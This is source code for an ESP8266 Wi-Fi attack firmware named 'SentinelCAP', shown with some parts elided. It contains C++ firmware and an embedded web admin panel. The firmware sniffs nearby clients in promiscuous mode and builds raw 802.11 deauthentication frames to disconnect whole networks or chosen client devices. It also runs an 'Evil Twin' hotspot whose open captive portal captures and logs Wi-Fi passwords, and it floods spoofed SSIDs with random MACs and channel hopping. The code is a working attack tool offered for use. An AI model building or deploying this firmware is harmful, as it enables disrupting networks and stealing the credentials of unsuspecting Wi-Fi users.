...
#include <vector> // For std::vector<String> to manage captured passwords
...
const char SETTINGS_FILE[] = "/settings.json"; // File for permanent settings storage
const char MASS_SPOOFING_SSIDS_FILE[] = "/mass_spoofing_ssids.txt"; // NEW: File for mass spoofing SSIDs
...
bool uploadErrorOccurred = false; // Flag for file upload errors
...
// NEW: Structure for discovered clients
typedef struct {
  uint8_t mac[6];
  String lastSeenSSID; // SSID of the AP they were communicating with
  unsigned long lastSeenTime;
} _Client;

std::vector<_Client> _discoveredClients; // Use vector for dynamic client list
const unsigned long CLIENT_TIMEOUT_MS = 60000; // Remove clients not seen for 60 seconds

// --- Global State Variables ---
// IMPROVEMENT: Use std::vector<String> for captured passwords to reduce heap fragmentation
std::vector<String> _capturedPasswordsLog; // Stores successfully captured passwords (runtime buffer)
...
struct AppSettings {
  ...
  bool enableRandomMac; // NEW: For mass spoofing
  bool enableChannelHopping; // NEW: For mass spoofing
  String webAdminUsername; // NEW: For web interface authentication
  String webAdminPassword; // NEW: For web interface authentication
  unsigned long deauthIntervalMs; // NEW: For dynamic deauth interval
};

AppSettings appSettings; // Global instance of settings

// --- Mass Spoofing Variables (NEW) ---
std::vector<String> massSpoofingSSIDs; // Use vector for dynamic SSID list
...
// NEW: Targeted Deauth Variables
uint8_t _targetClientMac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // MAC of the client to deauth
bool _isTargetClientSelected = false;
...
void handleNotFound();
bool isAuthenticated(); // NEW: For web admin authentication
...
void handleApiGetClients(); // NEW: Get discovered clients
void handleApiSelectClient(); // NEW: Select client for targeted deauth
...
void loadMassSpoofingSSIDs(); // NEW
void saveMassSpoofingSSIDs(); // NEW
...
// NEW: Promiscuous Mode Sniffing
void promiscuous_rx_cb(uint8_t *buf, uint16_t len);
void addOrUpdateClient(uint8_t* mac, const String& ssid);
void cleanupClients();
void printMac(uint8_t* mac); // Helper for printing MAC
...
<body>
    <div class="container-wrapper">
        ...
        <nav class="sidebar" id="sidebar">
            ...
            <a href="#" class="nav-item" data-tab="clients"> <!-- NEW TAB -->
        ...
        <main class="main-content" id="mainContent">
            ...
            <div id="clients-tab" class="tab-content">
                <div class="content-area">
                    <div class="flex-header">
                        <h2 style="color: #ff3333;">Discovered Clients</h2>
                        <div>
                            <button id="refresh-clients-btn" class="action-btn"><i class="fas fa-sync-alt"></i> Refresh Clients</button>
                            <button id="clear-clients-btn" class="action-btn red-btn"><i class="fas fa-trash-alt"></i> Clear Clients</button>
                        </div>
                    </div>
                    <div class="clients-list" id="clients-list">
                        <p class="text-gray">No clients discovered yet. Ensure promiscuous mode is active (it is by default).</p>
                    </div>
                </div>
            </div>
            ...
            <div id="attack-tab" class="tab-content">
                <div class="content-area">
                    ...
                    <div class="attack-grid">
                        <div class="attack-card">
                            ...
                            <div class="form-group">
                                <label for="deauth-target-type">Target:</label>
                                <select id="deauth-target-type">
                                    <option value="broadcast">Broadcast (All Clients)</option>
                                    <option value="targeted">Targeted (Specific Client)</option>
                                </select>
                            </div>
                            <div class="form-group" id="targeted-client-select-group" style="display:none;">
                                <label for="targeted-client-mac">Client MAC:</label>
                                <select id="targeted-client-mac">
                                    <option value="">Select a client</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label for="deauth-interval">Interval (ms):</label>
                                <input type="number" id="deauth-interval" value="1000" min="100" max="10000">
                            </div>
                    ...
                    <div class="mass-spoofing-section">
                        ...
                        <div class="mass-spoofing-actions">
                            <button id="mass-spoofing-btn" class="action-btn orange-btn">Start Mass Spoofing</button>
                            <button id="save-ssid-list-btn" class="action-btn small-btn"><i class="fas fa-save"></i> Save List</button>
                            <button id="load-ssid-list-btn" class="action-btn small-btn"><i class="fas fa-file-import"></i> Load List</button>
                        </div>
            ...
            <div id="settings-tab" class="tab-content">
                <div class="content-area">
                    ...
                    <div class="settings-section">
                        <h3>Mass Spoofing Defaults</h3>
                        <div class="form-group checkbox-group">
                            <input type="checkbox" id="setting-random-mac">
                            <label for="setting-random-mac">Enable Random MAC for Spoofing</label>
                        </div>
                        <div class="form-group checkbox-group">
                            <input type="checkbox" id="setting-channel-hop">
                            <label for="setting-channel-hop">Enable Channel Hopping for Spoofing</label>
                        </div>
                    </div>
                    <div class="settings-section">
                        <h3>Deauth Attack Defaults</h3>
                        <div class="form-group">
                            <label for="setting-deauth-interval">Default Deauth Interval (ms):</label>
                            <input type="number" id="setting-deauth-interval" value="1000" min="100" max="10000">
                        </div>
                    </div>
...
.clients-list .client-card:hover {
    background-color: #3a3a3a;
}

.clients-list .client-card .client-info {
    display: flex;
    align-items: center;
    gap: 10px;
}

.clients-list .client-card .client-icon {
    font-size: 24px;
    color: #66ccff;
}

.clients-list .client-card .details {
    text-align: right;
}

.clients-list .client-card .details .text-gray {
    color: #999;
    font-size: 13px;
}

.clients-list .client-card .select-btn {
    background-color: #ff3333;
    color: #fff;
    border: none;
    padding: 8px 15px;
...
.clients-list .client-card .select-btn:hover {
    background-color: #cc0000;
}

.clients-list .client-card.selected {
    border: 2px solid #ff3333;
    box-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
}
...
@media (max-width: 768px) {
    ...
    .networks-list .network-card,
    .files-list .file-item,
    .clients-list .client-card { /* Added client card */
        flex-direction: column;
    ...
    .networks-list .network-card .details,
    .files-list .file-item .file-actions,
    .clients-list .client-card .details, /* Added client card */
    .clients-list .client-card .client-actions { /* Added client card */
        width: 100%;
        text-align: left;
        margin-top: 10px;
    }
    ...
    .clients-list .client-card .select-btn { /* Added client card */
        width: 100%;
    }
...
let networks = [];
let discoveredClients = []; // NEW: Store discovered clients
let selectedNetwork = null;
let selectedClientMac = null; // NEW: For targeted deauth
let isDeauthActive = false;
let isHotspotActive = false;
let isMassSpoofingActive = false;
...
document.addEventListener('DOMContentLoaded', function() {
    ...
    scanNetworks();
    fetchSettings();
    fetchClients(); // NEW: Fetch clients on startup
...
function showTab(tabName) {
    ...
    if (currentTab === 'clients') { // NEW: Refresh clients when tab is opened
        fetchClients();
    }
}
...
function attachEventListeners() {
    ...
    // NEW: Clients Tab
    document.getElementById('refresh-clients-btn').addEventListener('click', fetchClients);
    ...
    document.getElementById('mass-spoofing-btn').addEventListener('click', toggleMassSpoofing);
    document.getElementById('save-ssid-list-btn').addEventListener('click', saveMassSpoofingSSIDs); // NEW
    document.getElementById('load-ssid-list-btn').addEventListener('click', loadMassSpoofingSSIDs); // NEW

    // NEW: Deauth Target Type and Client Selection
    const deauthTargetType = document.getElementById('deauth-target-type');
    const targetedClientSelectGroup = document.getElementById('targeted-client-select-group');
    const targetedClientMac = document.getElementById('targeted-client-mac');
    deauthTargetType.addEventListener('change', (e) => {
        if (e.target.value === 'targeted') {
            targetedClientSelectGroup.style.display = 'block';
            fetchClients(true); // Fetch clients and populate dropdown
        } else {
            targetedClientSelectGroup.style.display = 'none';
            selectedClientMac = null; // Clear selected client
        }
    });
    targetedClientMac.addEventListener('change', (e) => {
        selectedClientMac = e.target.value;
        console.log("Selected client for deauth: " + selectedClientMac);
    });
    document.getElementById('deauth-interval').addEventListener('change', (e) => {
        // Update settings immediately or on save settings
        // For now, just log the change
        console.log("Deauth interval set to: " + e.target.value);
    });
...
async function fetchClients(populateDropdown = false) {
    addToTerminal('[CLIENTS] Fetching discovered clients...');
    try {
        const response = await fetch('/api/clients');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        discoveredClients = await response.json();
        renderClients();
        addToTerminal(`[CLIENTS] Found ${discoveredClients.length} clients.`);

        if (populateDropdown) {
            populateClientDropdown();
        }
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch clients: ${error.message}`);
...
function renderClients() {
    ...
    if (discoveredClients.length === 0) {
        clientsList.innerHTML = '<p class="text-gray">No clients discovered yet.</p>';
        return;
    }

    discoveredClients.forEach(client => {
        const clientCard = document.createElement('div');
        clientCard.className = `client-card ${selectedClientMac === client.mac ? 'selected' : ''}`;
        
        clientCard.innerHTML = `
            <div class="client-info">
                <div class="client-icon"><i class="fas fa-user-tie"></i></div>
                <div>
                    <h3>${client.mac}</h3>
                    <p class="text-gray">Last Seen AP: ${client.lastSeenSSID || 'N/A'}</p>
                    <p class="text-gray">Last Seen: ${new Date(client.lastSeenTime).toLocaleTimeString()}</p>
                </div>
            </div>
            <div class="client-actions">
                <button data-mac="${client.mac}" class="action-btn small-btn select-client-btn">
                    ${selectedClientMac === client.mac ? 'Selected' : 'Select for Deauth'}
                </button>
            </div>
        `;
    ...
    clientsList.querySelectorAll('.select-client-btn').forEach(button => {
        button.addEventListener('click', (e) => {
            const macToSelect = e.currentTarget.dataset.mac;
            selectClientForDeauth(macToSelect);
        });
    });
}

function populateClientDropdown() {
    const dropdown = document.getElementById('targeted-client-mac');
    dropdown.innerHTML = '<option value="">Select a client</option>'; // Reset options

    discoveredClients.forEach(client => {
        const option = document.createElement('option');
        option.value = client.mac;
        option.textContent = `${client.mac} (${client.lastSeenSSID || 'N/A'})`;
        dropdown.appendChild(option);
    });

    // Set selected value if a client was already selected
    if (selectedClientMac) {
        dropdown.value = selectedClientMac;
    }
}

async function selectClientForDeauth(mac) {
    addToTerminal(`[INFO] Attempting to select client for deauth: ${mac}`);
    try {
        ...
        const result = await response.json();
        if (result.success) {
            selectedClientMac = mac; // Update local state
            renderClients(); // Re-render to show selection highlight
            addToTerminal(`[INFO] Client '${mac}' selected for targeted deauth.`);
            showNotification('Client selected for deauth!', 'success');
            // Update the dropdown to reflect selection
            document.getElementById('targeted-client-mac').value = mac;
        } else {
            addToTerminal(`[ERROR] Failed to select client: ${result.message}`);
            showNotification(`Failed to select client: ${result.message}`, 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during client selection: ${error.message}`);
        console.error("Error selecting client:", error);
        showNotification('Network error during client selection!', 'error');
    }
}

async function clearClients() {
    if (confirm('Are you sure you want to clear all discovered clients?')) {
        // This is a client-side clear for now. Server-side persistence would need an API.
        discoveredClients = [];
        selectedClientMac = null;
        renderClients();
        populateClientDropdown();
        addToTerminal('[CLIENTS] Discovered clients cleared.');
        showNotification('Discovered clients cleared!', 'info');
    }
}
...
async function toggleDeauth() {
    ...
    const deauthTargetType = document.getElementById('deauth-target-type').value;
    const deauthInterval = parseInt(document.getElementById('deauth-interval').value, 10);

    if (deauthTargetType === 'targeted' && !selectedClientMac) {
        showNotification('Please select a target client for targeted deauth.', 'error');
        return;
    }
    if (isNaN(deauthInterval) || deauthInterval < 100 || deauthInterval > 10000) {
        showNotification('Deauth interval must be between 100 and 10000 ms.', 'error');
        return;
    }
    ...
    try {
        const response = await fetch('/api/toggle_deauth', {
            ...
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                target_type: deauthTargetType,
                client_mac: selectedClientMac,
        ...
        updateDeauthUI();
        addToTerminal(`[DEAUTH] Deauth attack ${isDeauthActive ? 'started' : 'stopped'} on ${selectedNetwork.ssid} (${deauthTargetType === 'targeted' ? 'Targeted: ' + selectedClientMac : 'Broadcast'})`);
...
async function toggleMassSpoofing() {
    ...
    const randomMacCheckbox = document.getElementById('mass-spoofing-random-mac');
    const channelHopCheckbox = document.getElementById('mass-spoofing-channel-hop');
    ...
    if (isMassSpoofingActive) {
        ...
        try {
            const response = await fetch('/api/mass_spoofing', {
                ...
                body: JSON.stringify({ 
                    ssid_list: ssidList,
                    random_mac: randomMacCheckbox.checked,
                    channel_hop: channelHopCheckbox.checked
                })
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            ...
            updateMassSpoofingUI(result.current_spoofed_ssid);
            addToTerminal(`[SPOOF] ${result.message}`);
...
function updateMassSpoofingUI(currentSpoofedSsid = 'N/A') {
    const btn = document.getElementById('mass-spoofing-btn');
    const statusText = document.getElementById('mass-spoofing-status');
    const currentSpoofedSsidText = document.getElementById('current-spoofed-ssid');
    ...
    if (isMassSpoofingActive) {
        ...
        currentSpoofedSsidText.textContent = `Current: ${currentSpoofedSsid}`;
    } else {
        btn.textContent = 'Start Mass Spoofing';
        btn.classList.remove('red-btn');
        btn.classList.add('orange-btn');
        statusText.innerHTML = '<span class="text-red">Inactive</span>';
        currentSpoofedSsidText.textContent = 'Current: N/A';
    }
}

// NEW: Save/Load Mass Spoofing SSIDs
async function saveMassSpoofingSSIDs() {
    const ssidListTextarea = document.getElementById('ssid-list');
    const ssidList = ssidListTextarea.value;

    if (!ssidList.trim()) {
        showNotification('SSID list is empty. Nothing to save.', 'warning');
        return;
    }

    const filename = 'mass_spoofing_ssids.txt';
    const formData = new FormData();
    const blob = new Blob([ssidList], { type: 'text/plain' });
    formData.append('uploadFile', blob, filename);

    try {
        addToTerminal(`[FILE] Saving mass spoofing SSIDs to ${filename}...`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });
        ...
        if (response.ok) {
            ...
            showNotification('SSID list saved successfully!', 'success');
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to save SSID list: ${errorText}`);
            showNotification('Failed to save SSID list!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during saving SSID list: ${error.message}`);
        showNotification('Network error during saving SSID list!', 'error');
    }
}

async function loadMassSpoofingSSIDs() {
    const filename = 'mass_spoofing_ssids.txt';
    try {
        addToTerminal(`[FILE] Loading mass spoofing SSIDs from ${filename}...`);
        const response = await fetch(`/${filename}`); // Assuming direct file access
        if (!response.ok) {
            if (response.status === 404) {
                showNotification('No saved SSID list found.', 'info');
                addToTerminal('[FILE] No saved SSID list found.');
                return;
            }
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const ssidListContent = await response.text();
        document.getElementById('ssid-list').value = ssidListContent;
        addToTerminal(`[FILE] SSID list loaded successfully.`);
        showNotification('SSID list loaded successfully!', 'success');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to load SSID list: ${error.message}`);
        console.error("Error loading SSID list:", error);
        showNotification('Failed to load SSID list!', 'error');
    }
}
...
async function fetchLogs() {
    try {
        ...
        capturedPasswords = logs.passwords; // Now it's an array
        renderPasswordLogs();
    } catch (error) {
...
function renderSettings() {
    ...
    document.getElementById('setting-random-mac').checked = appSettings.enableRandomMac || false;
    document.getElementById('setting-channel-hop').checked = appSettings.enableChannelHopping || false;
    document.getElementById('setting-deauth-interval').value = appSettings.deauthIntervalMs || 1000; // NEW
    document.getElementById('deauth-interval').value = appSettings.deauthIntervalMs || 1000; // Also update attack tab
}
...
async function saveSettings() {
    const newSettings = {
        ...
        enableRandomMac: document.getElementById('setting-random-mac').checked,
        enableChannelHopping: document.getElementById('setting-channel-hop').checked,
        deauthIntervalMs: parseInt(document.getElementById('setting-deauth-interval').value, 10) // NEW
    };
...
async function deselectNetwork() {
    if (!selectedNetwork && !isMassSpoofingActive) {
    ...
    if (confirm('Are you sure you want to deselect the current network and stop all active attacks?')) {
        try {
            ...
            selectedClientMac = null; // NEW: Clear selected client
            ...
            renderNetworks();
            renderClients(); // NEW: Refresh clients to clear selection
            addToTerminal(`[INFO] ${result.message}`);
...
async function startStatusUpdates() {
    setInterval(async () => {
        try {
            ...
            isMassSpoofingActive = statusData.massSpoofingActive;
            updateMassSpoofingUI(statusData.currentSpoofedSsid);
            ...
            if (isMassSpoofingActive) systemStatusText = 'Mass Spoofing Active';
            ...
            // Update deauth interval in UI if it changed from settings
            if (appSettings.deauthIntervalMs && document.getElementById('deauth-interval').value != appSettings.deauthIntervalMs) {
                document.getElementById('deauth-interval').value = appSettings.deauthIntervalMs;
            }
...
async function generateReport() {
    ...
    try {
        ...
        const clientsResponse = await fetch('/api/clients'); // NEW: Fetch clients for report
        ...
        const report = {
            ...
            attackStatus: {
                ...
                massSpoofing: statusData.massSpoofingActive ? 'Active' : 'Inactive',
                currentSpoofedSsid: statusData.currentSpoofedSsid,
                capturedPasswordsCount: statusData.passwordCount
            },
            capturedPasswords: logsData.passwords, // Now it's an array
            discoveredClients: clientsData, // NEW: Add discovered clients to report
...
void setup() {
  ...
  display.println(F("SentinelCAP"));
  display.println(F("Initializing..."));
  display.display();
  Serial.println(F("[INFO] OLED Display initialized."));
  ...
  // IMPROVEMENT: Consider migrating to LittleFS for better robustness and wear leveling.
  // LittleFS setup: if (!LittleFS.begin()) { ... }
  if (!SPIFFS.begin()) {
    Serial.println(F("[ERROR] SPIFFS Mount Failed! Formatting..."));
    SPIFFS.format(); // Try formatting if mount fails
    if (!SPIFFS.begin()) {
      Serial.println(F("[FATAL] SPIFFS Mount Failed after format. Aborting."));
      while(true); // Halt execution
    }
    Serial.println(F("[INFO] SPIFFS formatted and mounted successfully."));
  } else {
    Serial.println(F("[INFO] SPIFFS mounted successfully."));
  }

  FSInfo fs_info;
  SPIFFS.info(fs_info);
  Serial.printf(F("[INFO] SPIFFS Total: %u bytes, Used: %u bytes\n"), fs_info.totalBytes, fs_info.usedBytes);

  // --- Load settings at startup ---
  loadSettings(); // Call the new loadSettings function
  loadCapturedPasswords(); // Load passwords on startup
  loadMassSpoofingSSIDs(); // NEW: Load mass spoofing SSIDs

  WiFi.mode(WIFI_AP_STA); // AP_STA mode for admin AP and scanning
  // Enable promiscuous mode for sniffing (and deauthentication)
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promiscuous_rx_cb); // NEW: Set promiscuous mode callback
  ...
  Serial.print(F("[INFO] Admin AP '"));
  Serial.print(appSettings.adminApSsid);
  Serial.print(F("' started with IP: "));
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(F("[INFO] DNS Server started."));

  // --- Web Server Routes ---
  // Serve embedded static files
  webServer.on("/", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    webServer.send(200, F("text/html"), INDEX_HTML);
  });
  webServer.on("/style.css", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Serving /style.css"));
    webServer.send(200, F("text/css"), STYLE_CSS);
  });
  webServer.on("/script.js", HTTP_GET, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    webServer.send(200, F("application/javascript"), SCRIPT_JS);
  });
  
  // API Endpoints (JSON responses) - ALL PROTECTED BY AUTHENTICATION
  ...
  webServer.on("/api/mass_spoofing", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiMassSpoofing();
  });
  webServer.on("/api/stop_mass_spoofing", HTTP_POST, []() {
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiStopMassSpoofing();
  });
  ...
  webServer.on("/api/clients", HTTP_GET, []() { // NEW: Get discovered clients
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiGetClients();
  });
  webServer.on("/api/select_client", HTTP_POST, []() { // NEW: Select client for targeted deauth
    if (!isAuthenticated()) return webServer.requestAuthentication();
    handleApiSelectClient();
  });
  ...
  // Captive Portal (for clients connecting to the Evil Twin) - NOT PROTECTED BY AUTH
  ...
  webServer.on("/update", HTTP_POST, []() {
    if (!isAuthenticated()) { // OTA update also needs authentication
      ...
      webServer.send(401, F("text/plain"), F("Unauthorized"));
      return;
    }
    webServer.sendHeader(F("Connection"), F("close"));
    webServer.send(200, F("text/plain"), (Update.hasError()) ? F("FAIL") : F("OK"));
    ESP.restart();
  }, handleOTAUpdate);
...
void loop() {
  ...
  if (deauthing_active && _selectedNetwork.ssid != "") {
    if (millis() - lastDeauthTime >= appSettings.deauthIntervalMs) { // Use dynamic interval
      ...
      wifi_set_channel(_selectedNetwork.ch); // Ensure we are on the target channel

      if (appSettings.enableDebugLogs) {
        Serial.printf(F("[DEAUTH] Sending deauth packet to %s (Ch: %d)\n"), _selectedNetwork.ssid.c_str(), _selectedNetwork.ch);
        Serial.printf(F("  DA: FF:FF:FF:FF:FF:FF (Broadcast)\n"));
        Serial.printf(F("  SA: %s (AP BSSID)\n"), bytesToStr(&deauthPacket[10], 6).c_str());
        Serial.printf(F("  BSSID: %s (AP BSSID)\n"), bytesToStr(&deauthPacket[16], 6).c_str());
        Serial.printf(F("  Reason Code: 0x0001 (Unspecified reason)\n"));
      }
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

      // NEW: Targeted Deauth
      if (_isTargetClientSelected) {
        uint8_t targetedDeauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, // FC, Duration
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // DA (Client MAC)
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA (AP BSSID)
                                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID)
                                            0x00, 0x00, // Sequence Control
                                            0x01, 0x00}; // Reason Code

        memcpy(&targetedDeauthPacket[4], _targetClientMac, 6); // Destination Address (Client)
        memcpy(&targetedDeauthPacket[10], _selectedNetwork.bssid, 6); // Source Address (AP)
        memcpy(&targetedDeauthPacket[16], _selectedNetwork.bssid, 6); // BSSID (AP)

        if (appSettings.enableDebugLogs) {
          Serial.printf(F("[DEAUTH] Sending targeted deauth to client %s (Ch: %d)\n"), bytesToStr(_targetClientMac, 6).c_str(), _selectedNetwork.ch);
        }
        wifi_send_pkt_freedom(targetedDeauthPacket, sizeof(targetedDeauthPacket), 0);
      }
  ...
  if (mass_spoofing_active && massSpoofingSSIDs.size() > 0 && millis() - lastSpoofingChangeTime >= SPOOFING_CHANGE_INTERVAL) {
    currentSpoofingIndex = (currentSpoofingIndex + 1) % massSpoofingSSIDs.size();
    String currentSpoofingSSID = massSpoofingSSIDs[currentSpoofingIndex];

    if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Channel hopping enabled: ") + String(appSettings.enableChannelHopping));
    if (appSettings.enableChannelHopping) {
    ...
    if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Switched AP to: ") + currentSpoofingSSID + F(" on Ch: ") + String(currentSpoofingChannel) + F(" MAC: ") + bytesToStr(macToUse, 6));
  ...
  if (millis() - lastWifiStatusCheck >= 2000) {
    ...
    if (WiFi.status() != WL_CONNECTED) {
      // if (appSettings.enableDebugLogs) Serial.println(F("[INFO] WiFi not connected to any AP."));
    } else {
      // if (appSettings.enableDebugLogs) Serial.println(F("[INFO] WiFi connected to AP: ") + WiFi.SSID());
    }
  ...
  // NEW: Cleanup old clients from the discovered list
  cleanupClients();
}
...
void performScan() {
  if (appSettings.enableDebugLogs) Serial.println(F("[SCAN] Starting WiFi scan..."));
  ...
  if (n > 0) {
    ...
    for (int i = 0; i < n && i < 16; ++i) {
      ...
      _networks[i] = network;
      if (appSettings.enableDebugLogs) {
        Serial.printf(F("[SCAN] %d: %s, Ch: %d, RSSI: %d, BSSID: %s, Security: %s\n"),
                      i + 1, network.ssid.c_str(), network.ch, network.rssi,
                      bytesToStr(network.bssid, 6).c_str(), network.security.c_str());
      }
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println(F("[SCAN] No networks found."));
  }
}
...
// NEW: Web Admin Authentication
bool isAuthenticated() {
  // If username or password is empty, no authentication is required (for initial setup)
...
bool handleFileRead(String path) {
  if (appSettings.enableDebugLogs) Serial.println(F("handleFileRead: ") + path);
  if (path.endsWith(F("/"))) path += F("index.html"); // If path is a directory, serve index.html
  String contentType = F("text/plain");
  if (path.endsWith(F(".html"))) contentType = F("text/html");
  else if (path.endsWith(F(".css"))) contentType = F("text/css");
  else if (path.endsWith(F(".js"))) contentType = F("application/javascript");
  else if (path.endsWith(F(".png"))) contentType = F("image/png");
  else if (path.endsWith(F(".gif"))) contentType = F("image/gif");
  else if (path.endsWith(F(".jpg"))) contentType = F("image/jpeg");
  else if (path.endsWith(F(".ico"))) contentType = F("image/x-icon");
  else if (path.endsWith(F(".xml"))) contentType = F("text/xml");
  else if (path.endsWith(F(".pdf"))) contentType = F("application/pdf");
  else if (path.endsWith(F(".zip"))) contentType = F("application/zip");
  else if (path.endsWith(F(".json"))) contentType = F("application/json"); // Added for JSON files
  else if (path.endsWith(F(".txt"))) contentType = F("text/plain"); // Added for text files like SSID lists
...
void handleApiScan() {
  ...
  for (int i = 0; i < 16; ++i) {
    ...
    networkObj[F("ssid")] = _networks[i].ssid;
    networkObj[F("bssid")] = bytesToStr(_networks[i].bssid, 6);
    networkObj[F("channel")] = _networks[i].ch;
    networkObj[F("rssi")] = _networks[i].rssi;
    networkObj[F("security")] = _networks[i].security;
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, F("application/json"), jsonResponse);
}
...
void handleApiSelectNetwork() {
  if (webServer.hasArg(F("plain"))) {
    ...
    if (error) {
      webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"Invalid JSON\"}"));
      return;
    }

    String bssidStr = doc[F("bssid")].as<String>();
    bool found = false;
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        _selectedNetwork = _networks[i];
        found = true;
        // NEW: Clear selected client when a new network is selected
        _isTargetClientSelected = false;
        memset(_targetClientMac, 0, 6);

        if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Selected network: ") + _selectedNetwork.ssid);
    ...
    if (found) {
      ...
      if (mass_spoofing_active) {
          ...
          if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Mass spoofing stopped due to network selection."));
      }
      webServer.send(200, F("application/json"), F("{\"success\": true, \"message\": \"Network selected\"}"));
    } else {
      webServer.send(404, F("application/json"), F("{\"success\": false, \"message\": \"Network not found\"}"));
    }
  } else {
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No data provided\"}"));
  }
}

void handleApiToggleDeauth() {
  if (_selectedNetwork.ssid == "") {
    if (appSettings.enableDebugLogs) Serial.println(F("[WARNING] Cannot toggle deauth: No network selected."));
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No target network selected\"}"));
    return;
  }
  ...
  if (webServer.hasArg(F("plain"))) {
    ...
    String targetType = doc[F("target_type")] | F("broadcast");
    String clientMacStr = doc[F("client_mac")] | "";
    appSettings.deauthIntervalMs = doc[F("interval")] | 1000; // Update interval from UI

    if (targetType == F("targeted")) {
      if (clientMacStr.isEmpty()) {
        webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"Targeted deauth requires a client MAC\"}"));
        return;
      }
      // Parse client MAC string to bytes
      sscanf(clientMacStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &_targetClientMac[0], &_targetClientMac[1], &_targetClientMac[2],
             &_targetClientMac[3], &_targetClientMac[4], &_targetClientMac[5]);
      _isTargetClientSelected = true;
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Targeted deauth client set to: ") + clientMacStr);
    } else {
      _isTargetClientSelected = false;
      memset(_targetClientMac, 0, 6); // Clear target client MAC
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Deauth target set to broadcast."));
    }
  }
  ...
  if (!deauthing_active && mass_spoofing_active) {
      ...
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
      dnsServer.start(DNS_PORT, F("*"), apIP);
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Mass spoofing stopped due to deauth activation."));
  }
  deauthing_active = !deauthing_active;
  if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Deauthentication ") + String(deauthing_active ? F("started") : F("stopped")) + F(" for ") + _selectedNetwork.ssid);
  webServer.send(200, F("application/json"), F("{\"success\": true, \"deauth_active\": ") + String(deauthing_active ? F("true") : F("false")) + F("}"));
}

void handleApiToggleHotspot() {
  if (_selectedNetwork.ssid == "") {
    if (appSettings.enableDebugLogs) Serial.println(F("[WARNING] Cannot toggle hotspot: No network selected."));
    webServer.send(400, F("application/json"), F("{\"success\": false, \"message\": \"No target network selected\"}"));
    return;
  }
  ...
  if (!hotspot_active && mass_spoofing_active) {
      ...
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
      dnsServer.start(DNS_PORT, F("*"), apIP);
      if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Mass spoofing stopped due to Evil Twin activation."));
  }

  hotspot_active = !hotspot_active;
  
  // Always disconnect current softAP to ensure clean state before reconfiguring
  if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Stopping current AP and DNS server for AP mode change..."));
  ...
  if (hotspot_active) {
    ...
    dnsServer.start(DNS_PORT, F("*"), apIP); // Restart DNS for Evil Twin
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Evil Twin hotspot started for: ") + _selectedNetwork.ssid);
  } else {
    ...
    dnsServer.start(DNS_PORT, F("*"), apIP); // Restart DNS for admin AP
    if (appSettings.enableDebugLogs) Serial.println(F("[INFO] Evil Twin hotspot stopped. Admin AP restarted."));
  }
  webServer.send(200, F("application/json"), F("{\"success\": true, \"hotspot_active\": ") + String(hotspot_active ? F("true") : F("false")) + F("}"));
}
...
void handleApiMassSpoofing() { // MODIFIED
  if (webServer.hasArg(F("plain"))) {
    ...
    String ssidList = doc[F("ssid_list")].as<String>();
    appSettings.enableRandomMac = doc[F("random_mac")] | false;
    appSettings.enableChannelHopping = doc[F("channel_hop")] | false;
    
    // Stop other attacks if mass spoofing is started
    if (hotspot_active) {
        hotspot_active = false;
        if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Evil Twin deactivated for Mass Spoofing."));
    }
    if (deauthing_active) {
        deauthing_active = false;
        _isTargetClientSelected = false; // Clear targeted deauth
        memset(_targetClientMac, 0, 6);
        if (appSettings.enableDebugLogs) Serial.println(F("[SPOOF] Deauth attack deactivated for Mass Spoofing."));
    }
    
    // Parse SSIDs into vector
    massSpoofingSSIDs.clear(); // Clear previous list
    int lastIndex = 0;
    for (int i = 0; i < ssidList.length(); i++) {
      if (ssidList.charAt(i) == '\n') {
        ...
